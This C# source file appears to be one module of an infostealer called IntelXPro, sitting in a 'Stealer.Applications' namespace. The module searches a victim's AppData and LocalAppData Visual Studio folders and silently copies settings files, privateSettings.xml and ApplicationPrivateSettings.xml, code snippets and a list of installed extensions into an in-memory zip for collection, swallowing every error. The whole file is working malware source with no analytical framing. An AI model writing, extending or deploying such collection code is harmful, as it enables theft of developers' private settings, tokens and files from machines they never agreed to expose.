using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class VisualStudio : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "VisualStudio");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "VisualStudio");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "VisualStudio";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);

                    string settingsPath = Path.Combine(versionDir, "Settings");
                    if (Directory.Exists(settingsPath))
                    {
                        string[] settingsFiles = Directory.GetFiles(settingsPath, "*.vssettings", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in settingsFiles)
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\VisualStudio\\{location}\\{versionName}\\Settings\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string extensionsPath = Path.Combine(versionDir, "Extensions");
                    if (Directory.Exists(extensionsPath))
                    {
                        string[] extensionDirs = Directory.GetDirectories(extensionsPath, "*", SearchOption.TopDirectoryOnly);
                        
                        if (extensionDirs.Length > 0)
                        {
                            StringBuilder extensionsList = new StringBuilder();
                            extensionsList.AppendLine("Installed Extensions:");
                            extensionsList.AppendLine();
                            
                            foreach (string extDir in extensionDirs)
                            {
                                string extName = Path.GetFileName(extDir);
                                extensionsList.AppendLine("- " + extName);
                            }
                            
                            string zipPath = $"Applications\\VisualStudio\\{location}\\{versionName}\\extensions_list.txt";
                            zip.AddTextFile(zipPath, extensionsList.ToString());
                            counterApplications.Files.Add(zipPath);
                            foundData = true;
                        }
                    }

                    string privateSettingsPath = Path.Combine(versionDir, "privateSettings.xml");
                    if (File.Exists(privateSettingsPath))
                    {
                        string zipPath = $"Applications\\VisualStudio\\{location}\\{versionName}\\privateSettings.xml";
                        zip.AddFile(zipPath, File.ReadAllBytes(privateSettingsPath));
                        counterApplications.Files.Add(privateSettingsPath + " => " + zipPath);
                        foundData = true;
                    }

                    string applicationPrivateSettingsPath = Path.Combine(versionDir, "ApplicationPrivateSettings.xml");
                    if (File.Exists(applicationPrivateSettingsPath))
                    {
                        string zipPath = $"Applications\\VisualStudio\\{location}\\{versionName}\\ApplicationPrivateSettings.xml";
                        zip.AddFile(zipPath, File.ReadAllBytes(applicationPrivateSettingsPath));
                        counterApplications.Files.Add(applicationPrivateSettingsPath + " => " + zipPath);
                        foundData = true;
                    }

                    string snippetsPath = Path.Combine(versionDir, "Code Snippets");
                    if (Directory.Exists(snippetsPath))
                    {
                        string[] snippetFiles = Directory.GetFiles(snippetsPath, "*.snippet", SearchOption.AllDirectories);
                        
                        foreach (string file in snippetFiles.Take(15))
                        {
                            string relativePath = file.Substring(snippetsPath.Length + 1);
                            string zipPath = $"Applications\\VisualStudio\\{location}\\{versionName}\\Snippets\\{relativePath.Replace("\\", "/")}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
